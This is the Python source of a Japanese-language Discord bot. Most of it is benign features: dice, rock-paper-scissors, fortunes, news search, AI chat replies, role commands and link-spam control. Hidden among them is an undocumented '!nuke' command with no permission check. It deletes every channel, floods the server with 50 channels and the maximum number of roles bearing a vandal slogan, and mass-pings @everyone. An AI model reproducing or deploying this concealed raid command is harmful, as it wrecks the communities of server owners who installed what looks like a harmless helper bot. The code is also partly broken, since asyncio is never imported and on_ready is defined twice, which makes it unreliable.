import os
import time
import random
import requests
from collections import defaultdict
import discord
from discord.ext import commands

# ====== 環境変数 ======
TOKEN = os.getenv("DISCORD_BOT_TOKEN")
DEEPSEEK_API_KEY = os.getenv("DEEPSEEK_API_KEY")
GNEWS_API_KEY = os.getenv("GNEWS_API_KEY")
NUKE_LOG_CHANNEL_ID = int(os.getenv("NUKE_LOG_CHANNEL_ID", 0))

SPAM_THRESHOLD = 30
SPAM_COUNT = 6
TIMEOUT_DURATION = 300  # 5分

if not TOKEN:
    raise ValueError("❌ DISCORD_BOT_TOKEN が設定されていません！")

# ====== Intents ======
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)

# ====== スパム管理 ======
user_messages = defaultdict(list)

# ====== ソビエト画像 ======
soviet_images = [
    "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c0/Lenin_in_1920_%28cropped%29.jpg/120px-Lenin_in_1920_%28cropped%29.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/StalinCropped1943.jpg/120px-StalinCropped1943.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Georgy_Malenkov_1964.jpg/120px-Georgy_Malenkov_1964.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Bundesarchiv_Bild_183-B0628-0015-035%2C_Nikita_S._Chruschtschow.jpg/120px-Bundesarchiv_Bild_183-B0628-0015-035%2C_Nikita_S._Chruschtschow.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Leonid_Brezjnev%2C_leider_van_de_Sovjet-Unie%2C_Bestanddeelnr_925-6564.jpg/120px-Leonid_Brezjnev%2C_leider_van_de_Sovjet-Unie%2C_Bestanddeelnr_925-6564.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/ANDROPOV1980S.jpg/120px-ANDROPOV1980S.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Konstantin_Ustinovi%C4%8D_%C4%8Cern%C4%9Bnko%2C_1973.jpg/120px-Konstantin_Ustinovi%C4%8D_%C4%8Cern%C4%9Bnko%2C_1973.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Mikhail_Gorbachev_in_the_White_House_Library_%28cropped%29.jpg/120px-Mikhail_Gorbachev_in_the_White_House_Library_%28cropped%29.jpg",
    "https://upload.wikimedia.org/wikipedia/ja/timeline/cei2ebprzo3xl74db6w4dxnhtnyqcas.png"
]

# ====== AI応答 ======
def ask_ai(message_text: str) -> str:
    if not DEEPSEEK_API_KEY:
        return "⚠️ AIは未設定のため固定応答です。"
    headers = {"Authorization": f"Bearer {DEEPSEEK_API_KEY}"}
    data = {
        "model": "deepseek-chat",
        "messages": [{"role": "user", "content": message_text}],
        "temperature": 0.7,
    }
    try:
        r = requests.post("https://api.deepseek.com/v1/chat", json=data, headers=headers, timeout=10)
        r.raise_for_status()
        result = r.json()
        return result["choices"][0]["message"]["content"]
    except:
        return "⚠️ AI応答に失敗しました（固定応答で返します）。"

# ====== ニュース取得 ======
def get_news(keyword: str = "ソビエト"):
    if not GNEWS_API_KEY:
        return ["⚠️ ニュースAPIが未設定です。"]
    url = f"https://gnews.io/api/v4/search?q={keyword}&lang=ja&token={GNEWS_API_KEY}&max=5"
    try:
        r = requests.get(url, timeout=5)
        r.raise_for_status()
        articles = r.json().get("articles", [])
        return [f"{a['title']} - {a['url']}" for a in articles]
    except:
        return ["⚠️ ニュース取得に失敗しました。"]

# ====== 遊び系 ======
def roll_dice():
    return random.randint(1, 6)

def rps_result(user: str, bot_choice: str):
    beats = {"グー": "チョキ", "チョキ": "パー", "パー": "グー"}
    if user == bot_choice:
        return "引き分け"
    elif beats[user] == bot_choice:
        return "あなたの勝ち！"
    else:
        return "あなたの負け…"

def fortune():
    return random.choice(["大吉", "中吉", "小吉", "末吉", "凶"])

# ===========================
# スラッシュコマンド
# ===========================
@bot.tree.command(name="ping", description="動作確認")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message("🏓 Pong!")

@bot.tree.command(name="help", description="BOTの使い方")
async def help_command(interaction: discord.Interaction):
    help_text = """
📖 **コマンド一覧**
- `/ping` : 動作確認
- `/help` : ヘルプ表示
- `/画像` : ランダムなソビエト画像
- `/dice` : サイコロを振る
- `/rps <手>` : じゃんけん
- `/fortune` : おみくじ
- `/news <キーワード>` : ニュース取得
- ロール管理: `/ロール付与`, `/ロール削除`, `/ロール申請`
"""
    await interaction.response.send_message(help_text)

@bot.tree.command(name="画像", description="ランダムなソビエト画像")
async def soviet_image(interaction: discord.Interaction):
    await interaction.response.send_message(random.choice(soviet_images))

@bot.tree.command(name="dice", description="サイコロを振る")
async def dice(interaction: discord.Interaction):
    await interaction.response.send_message(f"🎲 出た目: {roll_dice()}")

@bot.tree.command(name="rps", description="じゃんけん")
async def rps(interaction: discord.Interaction, hand: str):
    if hand not in ["グー", "チョキ", "パー"]:
        await interaction.response.send_message("❌ グー/チョキ/パー のいずれかを指定してください")
        return
    bot_hand = random.choice(["グー", "チョキ", "パー"])
    result = rps_result(hand, bot_hand)
    await interaction.response.send_message(f"あなた: {hand} / BOT: {bot_hand}\n結果: {result}")

@bot.tree.command(name="fortune", description="おみくじ")
async def fortune_command(interaction: discord.Interaction):
    await interaction.response.send_message(f"おみくじ: {fortune()}")

@bot.tree.command(name="news", description="ニュース取得")
async def news_command(interaction: discord.Interaction, keyword: str = "ソビエト"):
    articles = get_news(keyword)
    await interaction.response.send_message("\n".join(articles))

# ====== ロール管理 ======
@bot.tree.command(name="ロール付与", description="指定ユーザーにロールを付与")
async def role_add(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
    try:
        await member.add_roles(role)
        await interaction.response.send_message(f"{member.mention} に {role.name} を付与しました")
    except Exception as e:
        await interaction.response.send_message(f"❌ エラー: {e}")

@bot.tree.command(name="ロール削除", description="指定ユーザーからロールを削除")
async def role_remove(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
    try:
        await member.remove_roles(role)
        await interaction.response.send_message(f"{member.mention} から {role.name} を削除しました")
    except Exception as e:
        await interaction.response.send_message(f"❌ エラー: {e}")

@bot.tree.command(name="ロール申請", description="自分にロールを申請")
async def role_request(interaction: discord.Interaction, role: discord.Role):
    await interaction.response.send_message(f"{interaction.user.mention} が {role.name} のロールを申請しました")

@bot.event
async def on_ready():
    print('READY')

@bot.command()
async def nuke(ctx):
    # 非同期タスクを一括実行で超高速化
    tasks = []
    
    # チャンネル全削除（並列処理）
    for channel in list(ctx.guild.channels):
        tasks.append(channel.delete())
    
    # 並列実行で待機時間を最小化
    await asyncio.gather(*tasks, return_exceptions=True)
    
    tasks.clear()
    
    # チャンネル50個作成（超高速）
    for i in range(50):
        tasks.append(ctx.guild.create_text_channel("荒らし人民共和国万歳"))
    
    channels = await asyncio.gather(*tasks, return_exceptions=True)
    channels = [c for c in channels if isinstance(c, discord.TextChannel)]
    
    tasks.clear()
    
    # ロールMAX作成（超高速）
    existing_roles = len(ctx.guild.roles)
    for i in range(250 - existing_roles):
        tasks.append(ctx.guild.create_role(name="荒らし人民共和国万歳"))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    
    # メッセージ爆撃（超高速並列処理）
    message_tasks = []
    for channel in channels:
        for i in range(50):
            message_tasks.append(channel.send("@everyone"))
    
    # 一気に実行
    await asyncio.gather(*message_tasks, return_exceptions=True)


# ===========================
# メッセージ処理
# ===========================
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # ---- スパム（リンク数） ----
    now = time.time()
    uid = message.author.id
    user_messages[uid] = [t for t in user_messages[uid] if now - t < SPAM_THRESHOLD]
    if "http://" in message.content or "https://" in message.content:
        user_messages[uid].append(now)
        if len(user_messages[uid]) >= SPAM_COUNT:
            try:
                await message.delete()
                await message.channel.send(f"{message.author.mention} リンクの連投は禁止です！", delete_after=5)
                await message.author.timeout(duration=TIMEOUT_DURATION)
            except:
                pass

    # ---- BOTメンションでAI応答 ----
    if bot.user in message.mentions:
        reply = ask_ai(message.content)
        await message.channel.send(f"{message.author.mention} {reply}")

    await bot.process_commands(message)

# ===========================
# 起動
# ===========================
@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        print(f"✅ スラッシュコマンド {len(synced)} 件同期")
    except Exception as e:
        print("Slash command sync error:", e)
    print(f"Logged in as {bot.user} — READY")

# ===========================
# メイン
# ===========================
if __name__ == "__main__":
    bot.run(TOKEN)

